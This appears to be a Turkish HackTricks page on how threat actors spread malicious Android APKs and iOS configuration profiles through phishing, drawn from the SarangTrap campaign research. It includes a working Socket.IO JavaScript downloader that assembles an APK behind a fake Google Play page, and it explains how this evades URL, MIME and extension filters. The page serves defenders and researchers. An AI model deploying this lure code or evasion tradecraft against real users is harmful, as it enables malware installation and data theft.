# Mobil Kimlik Avı ve Kötü Amaçlı Uygulama Dağıtımı (Android ve iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin kimlik avı (SEO, sosyal mühendislik, sahte mağazalar, arkadaşlık uygulamaları vb.) yoluyla **kötü amaçlı Android APK'larını** ve **iOS mobil yapılandırma profillerini** dağıtmak için kullandığı teknikleri ele alır.
> Materyal, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap kampanyasından (2025) ve diğer kamuya açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>

## Saldırı Akışı

1. **SEO/Kimlik Avı Altyapısı**
   * Benzer görünümlü onlarca alan adı kaydedin (arkadaşlık, bulut paylaşımı, araç servisi…).  
     – Google'da üst sıralarda yer almak için `<title>` öğesinde yerel dilde anahtar kelimeler ve emojiler kullanın.  
     – Aynı açılış sayfasında hem Android (`.apk`) hem de iOS yükleme yönergelerini barındırın.
2. **İlk Aşama İndirmesi**
   * Android: *imzasız* veya “üçüncü taraf mağaza” APK'sına doğrudan bağlantı.  
   * iOS: kötü amaçlı **mobileconfig** profiline `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
3. **Android Kurulum Sonrası Davranış**
   * C2 denetimli çalıştırma, izinlerin kötüye kullanılması, dropper atlatma teknikleri, arka planda veri toplama ve kurulum sonrası diğer kötü amaçlı yazılım davranışları aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmıştır.
4. **iOS Dağıtım Tekniği**
   * Tek bir **mobil yapılandırma profili**, cihazı “MDM” benzeri denetime kaydetmek için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.  
   * Sosyal mühendislik yönergeleri:
     1. Ayarlar'ı açın ➜ *Profil İndirildi*.
     2. *Yükle* seçeneğine üç kez dokunun (kimlik avı sayfasında ekran görüntüleri bulunur).  
     3. İmzasız profile güvenin ➜ saldırgan, App Store incelemesi olmadan *Contacts* ve *Photo* yetkisi kazanır.
5. **iOS Web Clip Payload'u (kimlik avı uygulaması simgesi)**
   * `com.apple.webClip.managed` payload'ları, markalı bir simge/etiketle **bir kimlik avı URL'sini Ana Ekrana sabitleyebilir**.
   * Web Clip'ler **tam ekranda** çalışabilir (tarayıcı arayüzünü gizler) ve **kaldırılamaz** olarak işaretlenebilir; böylece simgeyi kaldırmak için kurbanın profili silmesi gerekir.<sup>[[3]](#references)</sup>
6. **Ağ Katmanı**
   * Düz HTTP; genellikle 80 numaralı portta ve `api.<phishingdomain>.com` gibi bir HOST başlığıyla.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → kolayca tespit edilir).

## Android Kötü Amaçlı Yazılımı: Post-Exploitation

C2, Accessibility'nin kötüye kullanılması, overlay'ler, ATS otomasyonu, aşamalı DEX yükleme, premium SMS ve kalıcılık gibi Android kötü amaçlı yazılımlarının kurulum sonrası teknikleri için bkz.:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket Tabanlı APK Kaçakçılığı + Sahte Google Play Sayfaları

Saldırganlar, statik APK bağlantılarını giderek daha fazla, Google Play'i andıran oltalara gömülü Socket.IO/WebSocket kanalıyla değiştiriyor. Bu, payload URL'sini gizler, URL/uzantı filtrelerini atlatır ve gerçekçi bir yükleme deneyimi sunar.<sup>[[2]](#references)[[4]](#references)</sup>

Gerçek saldırılarda gözlemlenen tipik istemci akışı:

<details>
<summary>Socket.IO sahte Play indiricisi (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Basit kontrolleri nasıl atlattığı:
- Sabit bir APK URL’si açığa çıkmaz; payload, WebSocket frame’lerinden bellekte yeniden oluşturulur.
- Doğrudan .apk yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSocket/Socket.IO üzerinden tünellenen ikili verileri gözden kaçırabilir.
- WebSocket’leri çalıştırmayan crawler’lar ve URL sandbox’ları payload’ı alamaz.

WebSocket tradecraft ve araçları hakkında ayrıca bkz.:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple aygıtları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Endonezyalı ve Vietnamlı Android Kullanıcılarını Hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
